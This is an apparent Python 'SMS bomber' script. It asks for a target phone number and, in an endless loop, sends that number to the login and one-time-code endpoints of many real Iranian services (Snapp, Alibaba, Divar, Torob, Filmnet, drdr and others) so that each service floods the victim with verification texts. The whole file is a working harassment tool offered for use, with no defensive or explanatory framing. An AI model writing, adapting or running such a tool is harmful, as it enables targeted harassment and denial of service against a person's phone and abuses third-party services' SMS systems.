

import requests
from colorama import Fore
import time
import sys
from colorama import Fore




texts=("""
 **   **                                   **    **                    
/**  /**                                  //**  **                     
/**  /**        ******  **    **  *****    //****    ******  **   **  
/**  /**       **////**/**   /** **///**    //**    **////**/**  /**  
/**  /**      /**   /**//** /** /*******     /**   /**   /**/**  /**    
/**  /**      /**   /** //****  /**////      /**   /**   /**/**  /**  
/**  /********//******   //**   //******     /**   //****** //******  
//   ////////  //////     //     //////      //     //////   //////    
""")
print(Fore.MAGENTA+texts)

print("------------------------------------------")
print("|      SMS  bomber.v1  && blackshot       |")
print("------------------------------------------")

cellphone=input("Enter target number:")
payload1={"cellphone": f"+98{cellphone}"}
payload2={"credential": {"phoneNumber": f"0{cellphone}", "role": "PASSENGER"}}
payload3={"phoneNumber": f'{cellphone}'}
payload4={"phone": f'0{cellphone}'}
payload7={"cellphone": f"0{cellphone}"}
payload10={"mobile": f"{cellphone}"}
payloa11={"phoneNumber": f'{cellphone}'}
payload12={"mobile": f"0{cellphone}"}
payload13={"mobile":f"0{cellphone}"}
payload14={"mobile": f"0{cellphone}"}
payload15={"mobileNumber":f"+98{cellphone}",'country':'1'}
payload16={"username": f"0{cellphone}"}
payload17={"phone":f"{cellphone}"}
payload18={"mobile": f"0{cellphone}"}
payload19={"phoneNumber": f"0{cellphone}","AuthenticationMode":"1"}
payload20={"username":f"0{cellphone}"}
payload21={"country_id": "205","mobile":f"{cellphone}"}
payload22={"username": f"0{cellphone}"}
payload23={"captchaHash": "","captchaValue":"","username":f"0{cellphone}"}
payload24={"mobile":f"0{cellphone}","redirectUrl":"/"}
payload25={"code":"98","phone":f"{cellphone}","smsStatus":"default"}

while True:
  time.sleep(1.5)
  req1=requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=payload1)
  if req1.status_code==200:
        print(Fore.GREEN,"send!")
        time.sleep(1.2)
  else:
      req1=requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=payload1)


  req2=requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=payload3)
  if req2.status_code==200:
        print("send!")
  else:
      req2=requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=payload3)


  req3=requests.post("https://api.divar.ir/v5/auth/authenticate",json=payload4)
  if req3.status_code==200:
        print("send!")
  else:
      req3=requests.post("https://api.divar.ir/v5/auth/authenticate",json=payload4)


  req4=requests.post(f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{cellphone}")
  if req4.status_code==200:
        print("send!")
  else:
       req4=requests.post(f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{cellphone}")


  req5=requests.get(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{cellphone}") 
  if req5.status_code==200:
        print("send!")
  else:
     req5=requests.get(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{cellphone}")  
     
  
  


  req6=requests.post(f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{cellphone}"%7D')   
  if  req6.status_code==200:
      print("send!")
  else:
      req6=requests.post(f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{cellphone}"%7D')



  req7=requests.post("https://nobat.ir/api/public/patient/login/phone", json=payload10)
  if req7.status_code==200:
      print("send!")
  else:
      req7=requests.post("https://nobat.ir/api/public/patient/login/phone", json=payload10)


  req8=requests.get(f"https://filmnet.ir/api-v2/access-token/users/{cellphone}/otp")
  if req8.status_code==200:
    print("send!")
  else:
    req8=requests.get(f"https://filmnet.ir/api-v2/access-token/users/{cellphone}/otp")





  req9=requests.post("https://drdr.ir/api/registerEnrollment/verifyMobile",json=payloa11)
  if req9.status_code==200:
    print("send!")
  else:
    req9=requests.post("https://drdr.ir/api/registerEnrollment/verifyMobile",json=payloa11)